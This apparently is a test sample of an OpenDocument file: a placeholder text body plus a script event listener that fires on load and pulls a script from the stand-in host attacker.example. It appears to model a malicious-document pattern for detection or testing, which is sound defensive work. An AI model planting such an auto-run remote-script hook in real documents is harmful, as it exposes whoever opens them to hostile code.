
<file path=META-INF/manifest.xml><?xml version="1.0" encoding="utf-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"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script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink">
  <office:body>
    <office:text>
      <text:p>Sample document body.</text:p>
      <script:event-listener script:language="ooo:script" script:event-name="OnLoad" xlink:href="https://attacker.example/payload.js" xlink:type="simple"/>
    </office:text>
  </office:body>
</office:document-content>
</file>